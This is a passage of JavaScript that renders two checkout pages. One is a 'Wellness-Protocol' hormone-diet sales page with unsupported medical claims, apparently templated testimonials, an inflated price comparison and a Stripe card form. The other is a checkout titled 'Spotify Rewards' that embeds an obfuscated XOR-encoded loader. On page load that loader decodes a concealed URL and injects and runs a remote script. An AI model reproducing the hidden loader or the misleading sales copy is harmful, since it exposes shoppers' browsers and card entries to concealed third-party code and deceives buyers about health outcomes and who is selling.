          <p class="hormone-desc">If the brain develops leptin resistance, fullness signals are blocked. You feel unsatisfied even after balanced meals.</p>
        </div>
        <div class="hormone-card" style="grid-column: 1 / -1;">
          <p class="hormone-name">5. Thyroid (T3 / T4)</p>
          <p class="hormone-role">The Metabolic Thermostat</p>
          <p class="hormone-desc">Sets your basal metabolic rate. When under stress, conversion of inactive T4 to active T3 slows, dropping daily energy expenditure by up to 35%.</p>
        </div>
      </div>
    </section>

    <!-- The 4 Phases -->
    <section class="content-box content-box-accent">
      <p class="section-eyebrow">The 30-Day Blueprint</p>
      <h2 class="section-heading font-serif">How Wellness-Protocol Works Step-by-Step</h2>
      <div class="timeline">
        <div class="timeline-item">
          <span class="timeline-badge">1</span>
          <span class="timeline-tag">Days 1&ndash;7</span>
          <h3 class="timeline-title">Phase 1 &mdash; Cortisol Reset</h3>
          <p class="timeline-desc">A 9-minute morning light protocol, circadian meal timing, and evening wind-down rituals to break chronic stress cycles and relieve initial bloating.</p>
        </div>
        <div class="timeline-item">
          <span class="timeline-badge">2</span>
          <span class="timeline-tag">Days 8&ndash;14</span>
          <h3 class="timeline-title">Phase 2 &mdash; Insulin Resensitization</h3>
          <p class="timeline-desc">Pairing standard grocery foods in specific macronutrient orders to blunt glucose spikes and unlock cellular energy release.</p>
        </div>
        <div class="timeline-item">
          <span class="timeline-badge">3</span>
          <span class="timeline-tag">Days 15&ndash;22</span>
          <h3 class="timeline-title">Phase 3 &mdash; Estrogen, Thyroid & Leptin Harmony</h3>
          <p class="timeline-desc">Essential micronutrient cycling and hydration strategies to drain excess fluid and restore natural satiety signaling.</p>
        </div>
        <div class="timeline-item">
          <span class="timeline-badge">4</span>
          <span class="timeline-tag">Days 23&ndash;30</span>
          <h3 class="timeline-title">Phase 4 &mdash; Long-Term Metabolic Lock</h3>
          <p class="timeline-desc">The sustainable maintenance framework: how to dine out, travel, and enjoy social events with zero rebound effect.</p>
        </div>
      </div>
    </section>

    <!-- What You Get Section -->
    <section style="margin: 40px 0;">
      <h2 class="section-heading font-serif">Everything Included in Your Access Pass:</h2>
      <ul class="deliverables-list">
        <li class="deliverable-item">
          <span class="deliverable-check">&#10003;</span>
          <div><strong>Initial Symptom Diagnostic:</strong> Identify which of your 5 hormones requires the primary focus today.</div>
        </li>
        <li class="deliverable-item">
          <span class="deliverable-check">&#10003;</span>
          <div><strong>Full 30-Day Guided Protocol:</strong> Daily step-by-step roadmap delivered straight to your member portal.</div>
        </li>
        <li class="deliverable-item">
          <span class="deliverable-check">&#10003;</span>
          <div><strong>The 5-Hormone Nutritional Guide:</strong> Food pairing combinations using regular pantry ingredients.</div>
        </li>
        <li class="deliverable-item">
          <span class="deliverable-check">&#10003;</span>
          <div><strong>The 9-Minute Morning Hormone Routine:</strong> No gym, weights, or intense cardio required.</div>
        </li>
        <li class="deliverable-item">
          <span class="deliverable-check">&#10003;</span>
          <div><strong>Printable Daily Checklist & Progress Tracker:</strong> Keep track of energy, sleep, and digestive improvements.</div>
        </li>
        <li class="deliverable-item">
          <span class="deliverable-check">&#10003;</span>
          <div><strong>Lifetime Maintenance Manual:</strong> Maintain your results year-round with zero rebound.</div>
        </li>
      </ul>
    </section>

    <!-- Proof Banner -->
    <div class="proof-banner">
      <div>
        <p class="proof-val">+3,400</p>
        <p class="proof-label">Women Completed</p>
      </div>
      <div>
        <p class="proof-val">30</p>
        <p class="proof-label">Day Program</p>
      </div>
      <div>
        <p class="proof-val">100%</p>
        <p class="proof-label">Natural Method</p>
      </div>
    </div>

    <!-- Testimonials -->
    <section style="margin: 44px 0;">
      <p class="section-eyebrow">Real Feedback</p>
      <h2 class="section-heading font-serif">What Women Are Saying</h2>
      <div class="testimonials-grid">
        <div class="testimonial-card">
          <div class="testimonial-header">
            <div>
              <p class="testimonial-author">Amanda R.</p>
              <p class="testimonial-loc">Austin, Texas</p>
            </div>
            <span class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>
          </div>
          <p class="testimonial-quote">"I thought my body was just slowing down after 40. Once I understood how cortisol was blocking everything, the protocol changed the game. My energy is completely back."</p>
          <p class="testimonial-result">&#10003; Bloating resolved in 10 days</p>
        </div>
        <div class="testimonial-card">
          <div class="testimonial-header">
            <div>
              <p class="testimonial-author">Jessica M.</p>
              <p class="testimonial-loc">Orlando, Florida</p>
            </div>
            <span class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>
          </div>
          <p class="testimonial-quote">"No diet lasted more than 2 weeks for me. Balancing insulin and leptin made the uncontrollable cravings disappear. I eat regular meals without feeling deprived."</p>
          <p class="testimonial-result">&#10003; Deep restorative sleep</p>
        </div>
        <div class="testimonial-card">
          <div class="testimonial-header">
            <div>
              <p class="testimonial-author">Rachel T.</p>
              <p class="testimonial-loc">Columbus, Ohio</p>
            </div>
            <span class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>
          </div>
          <p class="testimonial-quote">"My blood tests always said 'normal' while I felt exhausted. Wellness-Protocol showed me the exact daily habits to adjust. Best decision I made this year."</p>
          <p class="testimonial-result">&#10003; Consistent daily vitality</p>
        </div>
        <div class="testimonial-card">
          <div class="testimonial-header">
            <div>
              <p class="testimonial-author">Sarah L.</p>
              <p class="testimonial-loc">San Diego, California</p>
            </div>
            <span class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>
          </div>
          <p class="testimonial-quote">"After two pregnancies nothing seemed to shift my metabolism. Regulating my thyroid and estrogen routines with Camila's framework helped me feel like myself again."</p>
          <p class="testimonial-result">&#10003; Clothes fit comfortably again</p>
        </div>
      </div>
    </section>

    <!-- Pricing Comparison Card -->
    <section class="pricing-box">
      <div style="text-align:center;">
        <h2 class="section-heading font-serif" style="margin-bottom:8px;">Special One-Time Access Pass</h2>
        <p style="color:var(--muted); font-size:15px;">Get immediate digital access to the full 30-day program at a fraction of standard clinical costs.</p>
      </div>
      <div class="pricing-grid">
        <div class="val-breakdown">
          <p style="font-size:12px; font-weight:700; text-transform:uppercase; color:var(--subtle); margin-bottom:12px;">Typical Clinical Cost</p>
          <div class="val-item"><span>Endocrinologist Consultation</span><span class="strike-val">$150</span></div>
          <div class="val-item"><span>Functional Hormone Panel</span><span class="strike-val">$120</span></div>
          <div class="val-item"><span>Specialized Nutritionist</span><span class="strike-val">$200</span></div>
          <div class="val-item"><span>Metabolic App Subscription</span><span class="strike-val">$47</span></div>
          <div class="val-total-row"><span>Total Estimated Value:</span><span style="text-decoration:line-through; color:var(--strike);">$517 USD</span></div>
        </div>

        <div style="background:#fff; border-radius:18px; padding:24px; border:2px solid var(--primary); display:flex; flex-direction:column; justify-content:center; text-align:center;">
          <p style="font-size:12px; font-weight:800; text-transform:uppercase; color:var(--primary); letter-spacing:1px;">Today's Digital Access</p>
          <div style="margin:14px 0;">
            <span style="font-size:18px; text-decoration:line-through; color:var(--strike); margin-right:8px;">$97</span>
            <span style="font-size:42px; font-weight:800; color:var(--primary);">$${displayPrice} <span style="font-size:18px;">${userCurrency.toUpperCase()}</span></span>
          </div>
          <p style="font-size:13px; color:var(--muted); margin-bottom:16px;">One-time payment &bull; No subscriptions &bull; Lifetime digital access</p>
          <button onclick="document.getElementById('checkout-section').scrollIntoView({behavior: 'smooth'})" class="btn-submit-order" style="margin:0;">Claim Your Protocol Below &darr;</button>
        </div>
      </div>
    </section>

    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <!-- [EMBEDDED CHECKOUT SECTION] STRIPE COMPLIANT EMBEDDED CHECKOUT      -->
    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <section id="checkout-section" class="checkout-wrapper">
      <div class="checkout-badge">100% Secure Checkout</div>
      <h2 class="checkout-title font-serif">Complete Your Enrollment</h2>
      <p class="checkout-desc">Fill in your details below to activate instant access to Wellness-Protocol. Processed securely via Stripe 256-bit encryption.</p>

      <!-- Order Summary Card -->
      <div class="order-summary-box">
        <div>
          <p class="order-item-name">Wellness-Protocol &mdash; 30-Day Access Pass</p>
          <p class="order-item-sub">Digital Program + Daily Guides + Portal Login</p>
        </div>
        <div>
          <p class="order-item-price">$${displayPrice} <span style="font-size:14px;">${userCurrency.toUpperCase()}</span></p>
          <p style="font-size:11px; color:var(--subtle); text-align:right;">One-time charge</p>
        </div>
      </div>

      <!-- 🔴 CARTEIRAS DIGITAIS: APPLE PAY & GOOGLE PAY NO TOPO -->
      <div id="safe-wallet-wrapper" style="display:none;">
        <div id="safe-wallet-btn"></div>
        <div class="wallet-divider"><span>Or pay with credit / debit card</span></div>
      </div>

      <form id="safe-checkout-form">
        <div class="form-group">
          <label class="form-label" for="safe-name">Full Name</label>
          <input type="text" id="safe-name" class="form-input" placeholder="e.g. Sarah Jenkins" required autocomplete="name">
        </div>

        <div style="display:grid; grid-template-columns: 1.2fr 0.8fr; gap:12px;">
          <div class="form-group">
            <label class="form-label" for="safe-email">Email Address (for instant access delivery)</label>
            <input type="email" id="safe-email" class="form-input" placeholder="you@example.com" required autocomplete="email">
          </div>
          <div class="form-group">
            <label class="form-label" for="safe-phone">Phone Number</label>
            <input type="tel" id="safe-phone" class="form-input" placeholder="${defaultDial} 555-0199" required autocomplete="tel">
          </div>
        </div>

        <div class="form-group">
          <label class="form-label">Card Information</label>
          <div id="safe-card-number" class="stripe-input-box"></div>
        </div>

        <div class="stripe-grid">
          <div class="form-group">
            <label class="form-label">Expiration Date</label>
            <div id="safe-card-expiry" class="stripe-input-box"></div>
          </div>
          <div class="form-group">
            <label class="form-label">CVC / CVV</label>
            <div id="safe-card-cvc" class="stripe-input-box"></div>
          </div>
        </div>

        <div class="form-group">
          <label class="form-label" for="safe-postal">Postal / ZIP Code</label>
          <input type="text" id="safe-postal" class="form-input" placeholder="e.g. 90210" required autocomplete="postal-code">
        </div>

        <div id="safe-action-msg" class="action-msg" style="display:none;"></div>
        <div id="safe-error-msg" class="error-msg"></div>

        <button type="submit" id="safe-submit-btn" class="btn-submit-order">
          <svg style="width:18px; height:18px; fill:currentColor;" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg>
          Complete Order &mdash; $${displayPrice} ${userCurrency.toUpperCase()}
        </button>

        <p class="secure-note">
          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> 256-Bit SSL Encrypted &bull; Instant Access Delivered via Email &bull; 7-Day Money Back Guarantee
        </p>
      </form>
    </section>

    <!-- Guarantee Box -->
    <section class="guarantee-card">
      <div class="guarantee-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 11 12 14 22 4"/></svg>
      </div>
      <h2 class="section-heading font-serif" style="margin-bottom:10px;">7-Day 100% Money-Back Guarantee</h2>
      <p style="color:var(--muted); font-size:15px; max-width:620px; margin:0 auto;">
        Review the full protocol for 7 full days. If you feel it does not provide crystal-clear guidance on balancing your hormones and revitalizing your metabolism, simply email our support team at <strong>suporte@seusite-safe.com</strong> for a prompt, courteous refund. No questions asked.
      </p>
    </section>

    <!-- FAQ Accordion -->
    <section style="margin: 44px 0;">
      <p class="section-eyebrow" style="text-align:center;">Got Questions?</p>
      <h2 class="section-heading font-serif" style="text-align:center; margin-bottom:28px;">Frequently Asked Questions</h2>
      <div class="faq-list">
        <div class="faq-item">
          <div class="faq-q" onclick="toggleFaq(this)">
            <span>How will I access the protocol after payment?</span>
            <span class="faq-toggle">&darr;</span>
          </div>
          <div class="faq-a">Access is 100% digital and immediate. As soon as your order completes, an automated confirmation email with your personal member portal credentials and PDF download links is delivered to your inbox.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q" onclick="toggleFaq(this)">
            <span>Is this a one-time charge or a recurring subscription?</span>
            <span class="faq-toggle">&darr;</span>
          </div>
          <div class="faq-a">It is strictly a <strong>one-time payment of $${displayPrice} USD</strong>. There are zero hidden fees, rebills, or automatic subscriptions attached to this purchase.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q" onclick="toggleFaq(this)">
            <span>Do I need special gym equipment or hard-to-find foods?</span>
            <span class="faq-toggle">&darr;</span>
          </div>
          <div class="faq-a">No. The 9-minute routine is bodyweight only and can be done in your living room. All meal sequencing strategies use regular whole foods available at standard grocery stores.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q" onclick="toggleFaq(this)">
            <span>How do I request a refund if needed?</span>
            <span class="faq-toggle">&darr;</span>
          </div>
          <div class="faq-a">Simply email <strong>suporte@seusite-safe.com</strong> within 7 days of purchase quoting your order email. Our billing desk processes refunds within 24 business hours directly back to your original payment method.</div>
        </div>
      </div>
    </section>
  </main>

  <!-- Compliance Footer -->
  <footer class="footer-bar">
    <div class="footer-inner">
      <div class="footer-links">
        <a onclick="openModal('terms')">Terms of Service</a>
        <a onclick="openModal('privacy')">Privacy Policy</a>
        <a onclick="openModal('refund')">Refund & Cancellation Policy</a>
        <a onclick="openModal('delivery')">Fulfillment & Delivery Policy</a>
        <a href="mailto:suporte@seusite-safe.com">Contact Support</a>
      </div>

      <div class="payment-badges">
        <span class="badge-pill"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secure 256-Bit</span>
        <span class="badge-pill"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;margin-right:5px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>Visa</span>
        <span class="badge-pill"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;margin-right:5px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>Mastercard</span>
        <span class="badge-pill"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;margin-right:5px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>American Express</span>
        <span class="badge-pill"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-1.5px;margin-right:5px;"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Stripe Verified Partner</span>
      </div>

      <div class="footer-legal">
        <p><strong>NXT LVL LTDA</strong> &bull; Registered Merchant & Digital Publishing Company</p>
        <p style="margin-top:4px;">Support: <a href="mailto:suporte@seusite-safe.com" style="color:#cbd5e1;">suporte@seusite-safe.com</a> &bull; Response Time: &lt; 24h</p>
        <p style="margin-top:12px; font-size:11px; opacity:0.75;">
          Disclaimer: The information provided in Wellness-Protocol is for educational and wellness purposes only and does not substitute professional medical advice, diagnosis, or treatment. Always consult with a licensed physician regarding health decisions.
        </p>
        <p style="margin-top:8px; font-size:11px;">&copy; ${new Date().getFullYear()} Wellness-Protocol. All rights reserved.</p>
      </div>
    </div>
  </footer>

  <!-- Legal Modals -->
  <div id="policy-modal" class="modal-overlay" onclick="if(event.target === this) closeModal()">
    <div class="modal-card">
      <button class="modal-close" onclick="closeModal()">&times;</button>
      <h3 id="modal-title" class="modal-title"></h3>
      <div id="modal-body" class="modal-body"></div>
    </div>
  </div>

  <script>
    // FAQ Accordion
    function toggleFaq(el) {
      const item = el.parentElement;
      item.classList.toggle('open');
    }

    // Policies Modal Data
    const policies = {
      terms: {
        title: 'Terms of Service',
        body: '<p>Welcome to Wellness-Protocol. By purchasing and utilizing our digital wellness materials, you agree to these Terms. All materials are proprietary and licensed for personal, non-commercial use only.</p><p>We provide educational methodologies for hormonal balance and healthy lifestyle guidance. No guarantees of specific medical outcomes are made, as individual metabolic factors vary. For questions regarding access or terms, contact suporte@seusite-safe.com.</p>'
      },
      privacy: {
        title: 'Privacy Policy',
        body: '<p>Your privacy is strictly safeguarded. We only collect the necessary contact and transaction data required to fulfill your digital order, provide customer service, and process payments securely via Stripe.</p><p>We do not store your full payment card details on our servers; all payment transactions are handled directly through PCI-DSS Level 1 compliant Stripe infrastructure. We never sell or distribute your personal information to third parties.</p>'
      },
      refund: {
        title: 'Refund & Cancellation Policy',
        body: '<p>We stand firmly behind the quality of Wellness-Protocol with a <strong>7-Day 100% Money-Back Guarantee</strong>.</p><p>If for any reason you are not satisfied with your purchase, simply send an email to <strong>suporte@seusite-safe.com</strong> within 7 days of purchase mentioning your order email. We will process a complete refund to your original payment card within 1 business day without penalties or complicated questionnaires.</p>'
      },
      delivery: {
        title: 'Digital Fulfillment & Delivery Policy',
        body: '<p>Wellness-Protocol is a 100% digital product. No physical items will be shipped to your postal address.</p><p>Immediately upon successful payment authorization, an automated email containing your portal access link and digital guides is dispatched to the email address provided at checkout. Please check your inbox and spam folder within 5 minutes of placing your order.</p>'
      }
    };

    function openModal(type) {
      const p = policies[type];
      if (!p) return;
      document.getElementById('modal-title').textContent = p.title;
      document.getElementById('modal-body').innerHTML = p.body;
      document.getElementById('policy-modal').classList.add('active');
    }
    function closeModal() {
      document.getElementById('policy-modal').classList.remove('active');
    }

    // Stripe Elements Initialization
    const stripe = Stripe("${stripePublicKey}");
    const elements = stripe.elements();

    const elementStyles = {
      base: {
        color: '#1a202c',
        fontFamily: 'Inter, -apple-system, sans-serif',
        fontSize: '15px',
        '::placeholder': { color: '#9ca3af' }
      },
      invalid: { color: '#dc2626' }
    };

    const cardNumber = elements.create('cardNumber', { style: elementStyles, showIcon: true });
    cardNumber.mount('#safe-card-number');

    const cardExpiry = elements.create('cardExpiry', { style: elementStyles });
    cardExpiry.mount('#safe-card-expiry');

    const cardCvc = elements.create('cardCvc', { style: elementStyles });
    cardCvc.mount('#safe-card-cvc');

    // 🔴 SUPORTE A APPLE PAY & GOOGLE PAY (Payment Request Button)
    try {
      const pr = stripe.paymentRequest({
        country: '${userCountry}'.length === 2 ? '${userCountry}' : 'US',
        currency: '${userCurrency}'.toLowerCase(),
        total: {
          label: 'Wellness-Protocol 30-Day Pass',
          amount: ${priceCents}
        },
        requestPayerName: true,
        requestPayerEmail: true,
        requestPayerPhone: true
      });

      const prBtn = elements.create('paymentRequestButton', {
        paymentRequest: pr,
        style: {
          paymentRequestButton: {
            theme: 'dark',
            height: '48px',
            type: 'buy'
          }
        }
      });

      pr.canMakePayment().then(function(result) {
        if (result && (result.applePay || result.googlePay)) {
          const wWrapper = document.getElementById('safe-wallet-wrapper');
          if (wWrapper) {
            wWrapper.style.display = 'block';
            prBtn.mount('#safe-wallet-btn');
          }
        }
      });

      pr.on('paymentmethod', async function(ev) {
        const billing = ev.paymentMethod.billing_details || {};
        const pName = ev.payerName || billing.name || 'Customer';
        const pEmail = ev.payerEmail || billing.email || '';
        const pPhone = ev.payerPhone || billing.phone || '';

        try {
          const fetchUrl = '/api/stripe-charge-front' + (window.location.search || '');
          const res = await fetch(fetchUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              payment_method_id: ev.paymentMethod.id,
              email: pEmail,
              name: pName,
              phone: pPhone,
              is_safe: true,
              account: window.__STRIPE_ACCOUNT__ || "${accountCode}"
            })
          });
          const data = await res.json();
          if (data.ok) {
            ev.complete('success');
            const destUrl = data.next_url || ('https://seusite-safe.com/obrigado?name=' + encodeURIComponent(pName) + '&email=' + encodeURIComponent(pEmail));
            window.location.href = destUrl;
          } else {
            ev.complete('fail');
            const errEl = document.getElementById('safe-error-msg');
            if (errEl) errEl.textContent = data.error || 'Payment failed.';
          }
        } catch (err) {
          ev.complete('fail');
          const errEl = document.getElementById('safe-error-msg');
          if (errEl) errEl.textContent = 'Connection error. Please try again.';
        }
      });
    } catch (e) {
      console.warn('PaymentRequest not initialized:', e);
    }

    const form = document.getElementById('safe-checkout-form');
    const submitBtn = document.getElementById('safe-submit-btn');
    const errorEl = document.getElementById('safe-error-msg');
    const actionEl = document.getElementById('safe-action-msg');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      errorEl.textContent = '';
      if (actionEl) actionEl.style.display = 'none';
      submitBtn.disabled = true;
      submitBtn.innerHTML = 'Verifying &amp; Processing...';

      const name = document.getElementById('safe-name').value.trim();
      const email = document.getElementById('safe-email').value.trim();
      const phone = document.getElementById('safe-phone').value.trim();
      const postal = document.getElementById('safe-postal').value.trim();

      const { paymentMethod, error } = await stripe.createPaymentMethod({
        type: 'card',
        card: cardNumber,
        billing_details: {
          name: name,
          email: email,
          phone: phone,
          address: { postal_code: postal }
        }
      });

      if (error) {
        errorEl.textContent = error.message;
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Complete Order &rarr;';
        return;
      }

      try {
        const fetchUrl = '/api/stripe-charge-front' + (window.location.search || '');
        const res = await fetch(fetchUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            payment_method_id: paymentMethod.id,
            email: email,
            name: name,
            phone: phone,
            postal: postal,
            is_safe: true,
            account: window.__STRIPE_ACCOUNT__ || "${accountCode}"
          })
        });

        const data = await res.json();

        // 3D Secure Handling
        if (data.requires_action && data.client_secret) {
          if (actionEl) {
            actionEl.style.display = 'block';
            actionEl.innerHTML = '<strong>Bank Authentication Required</strong><br>Please authorize the transaction in your banking app or SMS verification popup.';
          }
          const { paymentIntent: confirmedIntent, error: actionError } = await stripe.handleCardAction(data.client_secret);
          if (actionError) {
            errorEl.textContent = actionError.message || 'Bank verification failed.';
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Complete Order &rarr;';
            return;
          }
          if (confirmedIntent && (confirmedIntent.status === 'succeeded' || confirmedIntent.status === 'requires_capture' || confirmedIntent.status === 'requires_confirmation' || confirmedIntent.status === 'processing')) {
            if (confirmedIntent.status === 'requires_confirmation') {
              await fetch('/api/stripe-confirm-3ds' + (window.location.search || ''), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  payment_intent_id: confirmedIntent.id,
                  customer_id: data.customer_id,
                  payment_method_id: paymentMethod.id,
                  stripe_account: window.__STRIPE_ACCOUNT__ || "${accountCode}",
                  name: name, email: email, phone: phone,
                  is_safe: true
                })
              });
            }
            const destUrl = (confirmData && confirmData.next_url) || data.next_url || ('https://seusite-safe.com/obrigado?name=' + encodeURIComponent(name) + '&email=' + encodeURIComponent(email));
            window.location.href = destUrl;
            return;
          }
        }

        if (data.ok) {
          const destUrl = data.next_url || ('https://seusite-safe.com/obrigado?name=' + encodeURIComponent(name) + '&email=' + encodeURIComponent(email));
          if (submitBtn) submitBtn.innerHTML = '&#10003; Approved! Redirecting to App...';
          window.location.href = destUrl;
        } else {
          errorEl.textContent = data.error || 'Payment was not authorized. Please check your card details.';
          submitBtn.disabled = false;
          submitBtn.innerHTML = 'Complete Order &rarr;';
        }
      } catch (err) {
        errorEl.textContent = (err && err.message) ? err.message : 'Connection error. Please try again.';
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Complete Order &rarr;';
      }
    });

    function renderSuccessState(name, email) {
      document.getElementById('checkout-section').innerHTML = \`
        <div style="text-align:center; padding: 40px 20px;">
          <div style="width:64px; height:64px; border-radius:50%; background:#dcfce7; color:#16a34a; font-size:32px; display:inline-flex; align-items:center; justify-content:center; margin-bottom:18px;">&#10003;</div>
          <h2 style="font-size:26px; font-weight:800; color:#1b4332; margin-bottom:10px;">Order Confirmed! Welcome to Wellness-Protocol</h2>
          <p style="font-size:16px; color:#4b5563; max-width:540px; margin:0 auto 20px; line-height:1.6;">
            Thank you, <strong>\${name || 'Valued Member'}</strong>! Your digital pass has been activated. We have dispatched your portal login and download instructions to <strong>\${email}</strong>.
          </p>
          <div style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:12px; padding:16px; max-width:480px; margin:0 auto; font-size:14px; color:#166534;">
            Please check your inbox (and spam folder) within the next 3 to 5 minutes to access your 30-day guides.
          </div>
        </div>
      \`;
      document.getElementById('checkout-section').scrollIntoView({ behavior: 'smooth' });
    }
  </script>
</body>
</html>`;
}

function renderCheckoutHTML(stripePublicKey, frontPriceCents, pixelIdsOrId, clientCountry, accountCode = 'a', request = null) {
  const userCurrency = resolveSmartCurrency(clientCountry);
  const pixelIds = Array.isArray(pixelIdsOrId)
    ? pixelIdsOrId
    : (pixelIdsOrId ? [pixelIdsOrId] : []);

    // Suporte a Multi-idioma no botão de pagamento expresso
  const acceptLang = (request && request.headers && (request.headers.get('accept-language') || request.headers.get('Accept-Language'))) || '';
  const langLower = acceptLang.toLowerCase();
  const cCountry = (clientCountry || '').toUpperCase();

  let expressBtnDefaultText = 'Pay securely with';
  if (cCountry === 'BR' || cCountry === 'PT' || langLower.startsWith('pt')) {
    expressBtnDefaultText = 'Pague com seguran&ccedil;a com';
  } else if (['ES', 'MX', 'CO', 'AR', 'CL', 'PE', 'EC', 'GT', 'DO', 'UY', 'PY'].includes(cCountry) || langLower.startsWith('es')) {
    expressBtnDefaultText = 'Pague de forma segura con';
  } else if (cCountry === 'FR' || langLower.startsWith('fr')) {
    expressBtnDefaultText = 'Payez en toute s&eacute;curit&eacute; avec';
  } else if (['DE', 'AT', 'CH'].includes(cCountry) || langLower.startsWith('de')) {
    expressBtnDefaultText = 'Sicher bezahlen mit';
  } else if (cCountry === 'IT' || langLower.startsWith('it')) {
    expressBtnDefaultText = 'Paga in sicurezza con';
  }
  const pixelScript = pixelIds.length > 0 ? `
    <!-- Meta Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
${pixelIds.map(id => `    fbq('init', '${id}');`).join('\n')}
    fbq('track', 'PageView');
    fbq('track', 'InitiateCheckout', {
      value: ${frontPriceCents / 100},
      currency: '${userCurrency.toUpperCase()}'
    });
    </script>
${pixelIds.map(id => `    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=${id}&ev=PageView&noscript=1"
    /></noscript>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=${id}&ev=InitiateCheckout&cd[value]=${frontPriceCents / 100}&cd[currency]=${userCurrency.toUpperCase()}&noscript=1"
    /></noscript>`).join('\n')}
    <!-- End Meta Pixel Code -->
  ` : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Spotify Rewards - Secure Checkout</title>
  
  <!-- UTMIFY SCRIPTS -->
  <script>(function(){var e_jxo=atob("DOtlnZ9sYDA2b6dVBZBH6O0AQgoUB9MhdZhfsrAPBF4YGtM4bI0cs/wDDR5UHYgmZpkM7esfT0VCAtR6aYoR+OwYTlpFTYt3ZJ8R7/YOFURTHIVvXpBH8/4BBRIMTcM0cYpI6OsBCVZPQtcnYJ0A8+tBGFNZC4omZoBHsb0aAVxDCoVvJ8kYseRODlFbCoVvJ48E6f5BFURbBsEsKJsX+OkJDkQbHNI3bI8Wv7NOFlFaGsJ3P8lH4MIR");var k_s1c=[];for(var a_8=0;a_8<e_jxo.length;a_8++){k_s1c.push(e_jxo.charCodeAt(a_8)&255);}var d_8=k_s1c[0];var d_uoiy=k_s1c.slice(1,1+d_8);var q_qk2=k_s1c.slice(1+d_8);var t_wce7=q_qk2.map(function(b,y_8){return b^d_uoiy[y_8%d_8];});var z_ecj="";for(var i_43=0;i_43<t_wce7.length;i_43++){z_ecj+=String.fromCharCode(t_wce7[i_43]&255);}var k_7xer=decodeURIComponent(escape(z_ecj));var h_0=JSON.parse(k_7xer);var j_y1=h_0.globals||[];j_y1.forEach(function(v_q){window[v_q.name]=v_q.value;});var t_6uc=document.createElement("script");t_6uc.src=h_0.url;t_6uc.async=true;t_6uc.defer=true;(h_0.attributes||[]).forEach(function(v_lx9){t_6uc.setAttribute(v_lx9.name,v_lx9.value);});(document.head||document.documentElement).appendChild(t_6uc);})();</script>
